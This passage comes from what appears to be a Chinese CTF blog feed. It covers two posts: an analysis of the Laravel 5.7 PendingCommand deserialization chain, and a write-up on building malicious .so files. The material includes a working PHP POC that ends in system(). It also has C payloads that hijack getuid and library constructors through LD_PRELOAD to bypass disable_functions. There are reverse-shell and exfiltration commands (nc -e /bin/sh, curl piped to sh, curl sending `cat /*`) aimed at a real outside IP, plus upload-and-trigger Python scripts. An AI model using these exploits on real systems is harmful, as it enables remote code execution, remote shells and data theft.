aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后来到resolve：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Resolve the given type from the container.     *     * @param  string  $abstract     * @param  array  $parameters     * @return mixed     *&#x2F;    protected function resolve($abstract, $parameters &#x3D; [])    &#123;        $abstract &#x3D; $this-&gt;getAlias($abstract);        $needsContextualBuild &#x3D; ! empty($parameters) || ! is_null(            $this-&gt;getContextualConcrete($abstract)        );        &#x2F;&#x2F; If an instance of the type is currently being managed as a singleton we&#39;ll        &#x2F;&#x2F; just return an existing instance instead of instantiating new instances        &#x2F;&#x2F; so the developer can keep using the same objects instance every time.        if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;            return $this-&gt;instances[$abstract];        &#125;        $this-&gt;with[] &#x3D; $parameters;        $concrete &#x3D; $this-&gt;getConcrete($abstract);        &#x2F;&#x2F; We&#39;re ready to instantiate an instance of the concrete type registered for        &#x2F;&#x2F; the binding. This will instantiate the types, as well as resolve any of        &#x2F;&#x2F; its &quot;nested&quot; dependencies recursively until all have gotten resolved.        if ($this-&gt;isBuildable($concrete, $abstract)) &#123;            $object &#x3D; $this-&gt;build($concrete);        &#125; else &#123;            $object &#x3D; $this-&gt;make($concrete);        &#125;        &#x2F;&#x2F; If we defined any extenders for this type, we&#39;ll need to spin through them        &#x2F;&#x2F; and apply them to the object being built. This allows for the extension        &#x2F;&#x2F; of services, such as changing configuration or decorating the object.        foreach ($this-&gt;getExtenders($abstract) as $extender) &#123;            $object &#x3D; $extender($object, $this);        &#125;        &#x2F;&#x2F; If the requested type is registered as a singleton we&#39;ll want to cache off        &#x2F;&#x2F; the instances in &quot;memory&quot; so we can return it later without creating an        &#x2F;&#x2F; entirely new instance of an object on each subsequent request for it.        if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;            $this-&gt;instances[$abstract] &#x3D; $object;        &#125;        $this-&gt;fireResolvingCallbacks($abstract, $object);        &#x2F;&#x2F; Before returning, we will also set the resolved flag to &quot;true&quot; and pop off        &#x2F;&#x2F; the parameter overrides for this build. After those two things are done        &#x2F;&#x2F; we will be ready to return back the fully constructed class instance.        $this-&gt;resolved[$abstract] &#x3D; true;        array_pop($this-&gt;with);        return $object;    &#125;&#x2F;&#x2F;这里可以看到最后是返回了一个object的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Container的call函数：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Call the given Closure &#x2F; class@method and inject its dependencies.     *     * @param  callable|string  $callback     * @param  array  $parameters     * @param  string|null  $defaultMethod     * @return mixed     *&#x2F;    public function call($callback, array $parameters &#x3D; [], $defaultMethod &#x3D; null)    &#123;        return BoundMethod::call($this, $callback, $parameters, $defaultMethod);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>WisdomTree大师傅的想法:</p><p>通过整体跟踪，猜测开发者的本意应该是实例化<code>Illuminate\Contracts\Console\Kernel</code>这个类，但是在<code>getConcrete</code>这个方法中出了问题，导致可以利用php的反射机制实例化任意类。问题出在<code>vendor/laravel/framework/src/Illuminate/Container/Container.php</code>的704行，可以看到这里判断<code>$this-&gt;bindings[$abstract])</code>是否存在，若存在则返回<code>$this-&gt;bindings[$abstract][&#39;concrete&#39;]</code>。</p><p><code>$bindings</code>是<code>vendor/laravel/framework/src/Illuminate/Container/Container.php</code>文件中<code>Container</code>类中的属性。因此我们只要寻找一个继承自<code>Container</code>的类，即可通过反序列化控制 <code>$this-&gt;bindings</code>属性。而<code>Illuminate\Foundation\Application</code>恰好继承自<code>Container</code>类，这就是我选择<code>Illuminate\Foundation\Application</code>对象放入<code>$this-&gt;app</code>的原因。由于我们已知<code>$abstract</code>变量为<code>Illuminate\Contracts\Console\Kernel</code>，所以我们只需通过反序列化定义<code>Illuminate\Foundation\Application</code>的<code>$bindings</code>属性存在键名为<code>Illuminate\Contracts\Console\Kernel</code>的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是<code>Illuminate\Foundation\Application</code>类。  </p><p>从resolve那里开始，有这个<code>$concrete = $this-&gt;getConcrete($abstract);</code>，来看看getConcrete：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Get the concrete type for a given abstract.     *     * @param  string  $abstract     * @return mixed   $concrete     *&#x2F;    protected function getConcrete($abstract)    &#123;        if (! is_null($concrete &#x3D; $this-&gt;getContextualConcrete($abstract))) &#123;            return $concrete;        &#125;        &#x2F;&#x2F; If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just        &#x2F;&#x2F; assume each type is a concrete name and will attempt to resolve it as is        &#x2F;&#x2F; since the container should be able to resolve concretes automatically.        if (isset($this-&gt;bindings[$abstract])) &#123;            return $this-&gt;bindings[$abstract][&#39;concrete&#39;];        &#125;        return $abstract;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析可知第一个if进不去，来到第二个if，这个bindings是container的属性，所以可控，this是我们控制的application对象，所以这个getConcrete返回值我们也是可控的。</p><p>写个POC验证一下，不试不知道，一试下一跳，直接打穿了哈哈哈哈：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;dir&#39;;            $this-&gt;test&#x3D;new GenericUser();            $this-&gt;app&#x3D;new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application    &#123;        protected $bindings &#x3D; [];        public function __construct()&#123;            $this-&gt;bindings&#x3D;array(&#39;Illuminate\Contracts\Console\Kernel&#39;&#x3D;&gt;array(&#39;concrete&#39;&#x3D;&gt;&#39;Illuminate\Foundation\Application&#39;));        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()        &#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析到上面其实就已经能够命令执行了，因为后面的语句大概都没什么影响，if应该都进不去啥的。但还是继续分析一下，有始有终。</p><p>返回concrete的值后，来到了下面的语句：</p><pre class="line-numbers language-none"><code class="language-none">if ($this-&gt;isBuildable($concrete, $abstract)) &#123;            $object &#x3D; $this-&gt;build($concrete);        &#125; else &#123;            $object &#x3D; $this-&gt;make($concrete);        &#125;&#x2F;&#x2F;无法进行isBuildable，会再次make，然后resolve，然后getConcrete，因为this-&gt;bindings[&#39;Illuminate\Foundation\Application&#39;]不存在所以直接返回了[&#39;Illuminate\Foundation\Application&#39;]，然后满足isBuildable，进入build函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>build函数如下，由注释和<code>$reflector = new ReflectionClass($concrete);</code>可以看出这个函数反射实例化了一个对象，所以最后返回了一个<code>Illuminate\Foundation\Application</code>对象：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Instantiate a concrete instance of the given type.     *     * @param  string  $concrete     * @return mixed     *     * @throws \Illuminate\Contracts\Container\BindingResolutionException     *&#x2F;    public function build($concrete)    &#123;        &#x2F;&#x2F; If the concrete type is actually a Closure, we will just execute it and        &#x2F;&#x2F; hand back the results of the functions, which allows functions to be        &#x2F;&#x2F; used as resolvers for more fine-tuned resolution of these objects.        if ($concrete instanceof Closure) &#123;            return $concrete($this, $this-&gt;getLastParameterOverride());        &#125;        $reflector &#x3D; new ReflectionClass($concrete);        &#x2F;&#x2F; If the type is not instantiable, the developer is attempting to resolve        &#x2F;&#x2F; an abstract type such as an Interface or Abstract Class and there is        &#x2F;&#x2F; no binding registered for the abstractions so we need to bail out.        if (! $reflector-&gt;isInstantiable()) &#123;            return $this-&gt;notInstantiable($concrete);        &#125;        $this-&gt;buildStack[] &#x3D; $concrete;        $constructor &#x3D; $reflector-&gt;getConstructor();        &#x2F;&#x2F; If there are no constructors, that means there are no dependencies then        &#x2F;&#x2F; we can just resolve the instances of the objects right away, without        &#x2F;&#x2F; resolving any other types or dependencies out of these containers.        if (is_null($constructor)) &#123;            array_pop($this-&gt;buildStack);            return new $concrete;        &#125;        $dependencies &#x3D; $constructor-&gt;getParameters();        &#x2F;&#x2F; Once we have all the constructor&#39;s parameters we can create each of the        &#x2F;&#x2F; dependency instances and then use the reflection instances to make a        &#x2F;&#x2F; new instance of this class, injecting the created dependencies in.        $instances &#x3D; $this-&gt;resolveDependencies(            $dependencies        );        array_pop($this-&gt;buildStack);        return $reflector-&gt;newInstanceArgs($instances);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回来之后，就Application会调用call函数，这个函数是继承来自Container的</p><pre class="line-numbers language-none"><code class="language-none">public function call($callback, array $parameters &#x3D; [], $defaultMethod &#x3D; null)    &#123;        return BoundMethod::call($this, $callback, $parameters, $defaultMethod);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>来到BoundMethod::call，这里有一个call_user_func_array经典的调用函数进行命令执行，这个应该就是最后的地方了。</p><pre class="line-numbers language-none"><code class="language-none">public static function call($container, $callback, array $parameters &#x3D; [], $defaultMethod &#x3D; null)    &#123;        if (static::isCallableWithAtSign($callback) || $defaultMethod) &#123;            return static::callClass($container, $callback, $parameters, $defaultMethod);        &#125;        return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) &#123;            return call_user_func_array(                $callback, static::getMethodDependencies($container, $callback, $parameters)            );        &#125;);    &#125;&#x2F;&#x2F;打断点知道第一个if进不去，然后直接进行第二个return，注意到有一个call_user_func_array<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟入到getMethodDependencies：</p><pre class="line-numbers language-none"><code class="language-none">protected static function getMethodDependencies($container, $callback, array $parameters &#x3D; [])    &#123;        $dependencies &#x3D; [];        foreach (static::getCallReflector($callback)-&gt;getParameters() as $parameter) &#123;            static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);        &#125;        return array_merge($dependencies, $parameters);    &#125;&#x2F;&#x2F;这里array_merge进行了一个数组的合并，没有什么影响。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概到这里整个链子就分析完毕了，相当于最后执行了一个<code>call_user_func_array(&#39;system&#39;,array(0=&gt;&#39;dir));</code></p><p>最终serialize.php代码:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;dir&#39;;            $this-&gt;test&#x3D;new GenericUser();            $this-&gt;app&#x3D;new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application    &#123;        protected $bindings &#x3D; [];        public function __construct()&#123;            $this-&gt;bindings&#x3D;array(&#39;Illuminate\Contracts\Console\Kernel&#39;&#x3D;&gt;array(&#39;concrete&#39;&#x3D;&gt;&#39;Illuminate\Foundation\Application&#39;));        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()        &#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本次还是学到了点东西的，关于laravel框架也基本上有一定的了解了，跟着大师傅的博客慢慢分析了5.7的一个关于PendingCommand的反序列化漏洞点，学习到了。继续加油吧！</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花式构造恶意so文件</title>
      <link href="/2022/04/28/hua-shi-gou-zao-e-yi-so-wen-jian/"/>
      <url>/2022/04/28/hua-shi-gou-zao-e-yi-so-wen-jian/</url>
      
        <content type="html"><![CDATA[<h3 id="劫持mysqli"><a href="#劫持mysqli" class="headerlink" title="劫持mysqli"></a>劫持mysqli</h3><h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><pre class="line-numbers language-none"><code class="language-none"> &lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;    case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        shell_exec(&quot;php -r &#39;ctfshow();&#39;&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>扩展目录</p><p><img src="/images/so/extension.png" class="lazyload placeholder" data-srcset="/images/so/extension.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20180731</p><h4 id="条件分析"><a href="#条件分析" class="headerlink" title="条件分析"></a>条件分析</h4><p><img src="/images/so/condition.png" class="lazyload placeholder" data-srcset="/images/so/condition.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h3 id="1-纯手动构造so"><a href="#1-纯手动构造so" class="headerlink" title="1 纯手动构造so"></a>1 纯手动构造so</h3><p>有时间再补充</p><h3 id="2-使用ext-skel"><a href="#2-使用ext-skel" class="headerlink" title="2 使用ext_skel"></a>2 使用ext_skel</h3><p>其中c文件有修改的地方</p><p><img src="/images/so/change.png" class="lazyload placeholder" data-srcset="/images/so/change.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>apt-get install 安装的php是没有ext_skel.php的,需要自己去下载源码包</p><p><img src="/images/so/ext_skel.png" class="lazyload placeholder" data-srcset="/images/so/ext_skel.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;fi2.php.net&#x2F;get&#x2F;php-7.1.11.tar.gz&#x2F;from&#x2F;this&#x2F;mirrortar -zxvf php-7.0.2.tar.gz安装：.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;phpmakemake install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先生成一个假的mysqli扩展</p><pre class="line-numbers language-none"><code class="language-none">php ext_skel.php --ext mysqli --author w1nd --stdphp ext_skel.php --ext ctfshow --author w1nd --std<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进入该目录找到c文件在test1处加入反弹shell的代码</p><pre class="line-numbers language-none"><code class="language-none">nc 175.178.47.228 8888 -e &#x2F;bin&#x2F;shcurl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | shcurl http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;?p&#x3D;&#96;cat &#x2F;*&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>还有改变的地方</p><p><img src="/images/so/so-change.png" class="lazyload placeholder" data-srcset="/images/so/so-change.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>写出来先：</p><pre class="line-numbers language-none"><code class="language-none">第一个地方是PHP_FUNCTION函数那里写入自己需要执行的命令第二个地方是下面这个:static const zend_function_entry ctfshow_functions[] &#x3D; &#123;        PHP_FE(ctfshow,         arginfo_mysqli_test1)        PHP_FE(mysqli_test2,           arginfo_mysqli_test2)        PHP_FE_END&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-none"><code class="language-none">phpize.&#x2F;configure --enable-mysqlimakemake install特意说明，最好使用跟题目的同一版本，不同大版本之间有差异性，所以可能打不通。例如下面的使用方式：&#x2F;etc&#x2F;php&#x2F;8.0.9&#x2F;bin&#x2F;phpize       &#x2F;&#x2F;注意使用指定版本的phpize,如果使用过其他版本的phpize,记住清空旧版本的残余.&#x2F;configure --with-php-config&#x3D;&#x2F;etc&#x2F;php&#x2F;8.0.9&#x2F;bin&#x2F;php-config    &#x2F;&#x2F;同样指定版本的php-configmakesudo make install   &#x2F;&#x2F;安装到指定版本的so目录下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后会告诉生成的so文件所在目录：</p><pre class="line-numbers language-none"><code class="language-none">Installing shared extensions:     &#x2F;usr&#x2F;lib&#x2F;php&#x2F;20210902&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python脚本跑一下：</p><pre class="line-numbers language-none"><code class="language-none">import requests  url&#x3D;&quot;http:&#x2F;&#x2F;7d007399-e8e6-4dd9-947f-4ad7a8456559.challenge.ctf.show&#x2F;&quot;sodata&#x3D;open(&quot;mysqli.so&quot;, &#39;rb&#39;).read()# 扩展目录可以在phpinfo中看到data &#x3D; &#123;    &#39;file&#39;: &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20180731&#x2F;mysqli.so&#39;,    &#39;content&#39;: sodata&#125;requests.post(url+&quot;?a&#x3D;write&quot;,data&#x3D;data)requests.get(url+&quot;?a&#x3D;run&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-gcc"><a href="#3-gcc" class="headerlink" title="3 gcc"></a>3 gcc</h3><p>先写一个c文件</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdlib.h&gt;#include&lt;string.h&gt;__attribute__((constructor))void payload()&#123;unserenv(&quot;LD_PRELOAD&quot;);const char* cmd &#x3D; getenv(&quot;CMD&quot;);    system(cmd);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接gcc生成共享库</p><pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC a.c -o hack&amp;&amp;gcc --share hack -o hack.sogcc -c -fPIC exp.c -o exp &amp;&amp; gcc -shared exp -o exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="利用LD-PRELOAD劫持getuid函数"><a href="#利用LD-PRELOAD劫持getuid函数" class="headerlink" title="利用LD_PRELOAD劫持getuid函数"></a>利用LD_PRELOAD劫持getuid函数</h3><p>上面的方法，需要重启或者命令行来执行php重载so文件，利用条件苛刻，所以我们需要寻找到不重启php-fpm的方法。</p><h4 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><pre class="line-numbers language-none"><code class="language-none"> &lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;    case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        putenv($_GET[&#39;env&#39;]);        system(&quot;whoami&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果扩展目录不可写，且无法重启php-fpm，就需要使用到putenv函数来实现执行恶意so文件</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="/images/so/getuid.png" class="lazyload placeholder" data-srcset="/images/so/getuid.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>大概意思就是：php调用mail函数后，会调用linux下的&#x2F;usr&#x2F;bin&#x2F;sendemail，创建一个新的进程，建了新的进程就会调用getuid函数，所以只要我们通过设置继承LD_PRELOAD环境变量提前加载恶意的so文件，那么新建进程的时候就会执行恶意so文件中的getuid这个恶意的函数代码。</p><h4 id="想要利用LD-PRELOAD环境变量绕过disable-functions需要注意以下几点："><a href="#想要利用LD-PRELOAD环境变量绕过disable-functions需要注意以下几点：" class="headerlink" title="想要利用LD_PRELOAD环境变量绕过disable_functions需要注意以下几点："></a>想要利用LD_PRELOAD环境变量绕过disable_functions需要注意以下几点：</h4><blockquote><p>能够上传自己的.so文件</p><p>能够控制LD_PRELOAD环境变量的值，比如putenv()函数</p><p>因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</p></blockquote><h4 id="getuid"><a href="#getuid" class="headerlink" title="getuid"></a>getuid</h4><p>函数原型：</p><p><img src="/images/so/getuid-function.png" class="lazyload placeholder" data-srcset="/images/so/getuid-function.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>重写后,第一种方式：</p><p><img src="/images/so/getuid-change.png" class="lazyload placeholder" data-srcset="/images/so/getuid-change.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>也可以写成下面这种：</p><p>getuid.c</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload()&#123;        &#x2F;&#x2F;system(&quot;curl http:&#x2F;&#x2F;175.178.47.228:8888?s&#x3D;&#96;cat &#x2F;*&#96;&quot;);        system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | sh&quot;);&#125;int getuid()&#123;        if(getenv(&quot;LD_PRELOAD&quot;)&#x3D;&#x3D;NULL)&#123; return 0;&#125;        unsetenv(&quot;LD_PRELOAD&quot;);        payload();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用下面语句gcc编译上面的c文件生成恶意so文件</p><pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC getuid.c -o getuidgcc --share getuid -o getuid.so或者gcc -c -fPIC getuid.c -o getuid&amp;&amp;gcc --share getuid -o getuid.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用python脚本跑题目反弹shell：</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;690602f6-e0b4-4a2b-b0e0-b36c4e383275.challenge.ctf.show&#x2F;&quot;data&#x3D;&#123;&#39;file&#39;:&#39;&#x2F;tmp&#x2F;hack.so&#39;,&#39;content&#39;:open(&#39;hack.so&#39;,&#39;rb&#39;).read()&#125;requests.post(url+&#39;?a&#x3D;write&#39;,data&#x3D;data)requests.get(url+&#39;?a&#x3D;run&amp;env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;hack.so&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="补充-PHP会产生进程的一些函数"><a href="#补充-PHP会产生进程的一些函数" class="headerlink" title="补充-PHP会产生进程的一些函数"></a>补充-PHP会产生进程的一些函数</h3><p><img src="/images/so/function-process.png" class="lazyload placeholder" data-srcset="/images/so/function-process.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h3 id="利用LD-PRELOAD劫持构造函数（与上方getuid不同，这个通杀）"><a href="#利用LD-PRELOAD劫持构造函数（与上方getuid不同，这个通杀）" class="headerlink" title="利用LD_PRELOAD劫持构造函数（与上方getuid不同，这个通杀）"></a>利用LD_PRELOAD劫持构造函数（与上方getuid不同，这个通杀）</h3><p>如果十个题目十个不同的函数，那么就要构造十个不同的恶意so文件来劫持，所以思考有没有一种方法可以构造一种恶意so文件就能通杀所有函数。</p><h4 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><pre class="line-numbers language-none"><code class="language-none"> &lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;        case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        putenv($_GET[&#39;env&#39;]);        mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125; # 其实这题也可以用getuid来劫持<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="利用构造函数constructor编写恶意so文件"><a href="#利用构造函数constructor编写恶意so文件" class="headerlink" title="利用构造函数constructor编写恶意so文件"></a>利用构造函数constructor编写恶意so文件</h4><p>首先写一个construct.c</p><pre class="line-numbers language-none"><code class="language-none">#define _GNU_SOURCE#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;__attribute__ ((__constructor__)) void construct(void)&#123;if(getenv(&quot;LD_PRELOAD&quot;)&#x3D;&#x3D;NULL)&#123; return 0;&#125;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | sh&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>gcc编译构造恶意so文件</p><pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC construct.c -o construct &amp;&amp; gcc --share construct -o construct.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后就是差不多的代码反弹shell：</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;acf81259-d67b-47ab-a09b-3ee9c62d8143.challenge.ctf.show&#x2F;&quot;sodata&#x3D;open(&quot;construct.so&quot;,&quot;rb&quot;).read()data&#x3D;&#123;    &quot;file&quot;: &quot;&#x2F;tmp&#x2F;construct.so&quot;,    &quot;content&quot;: 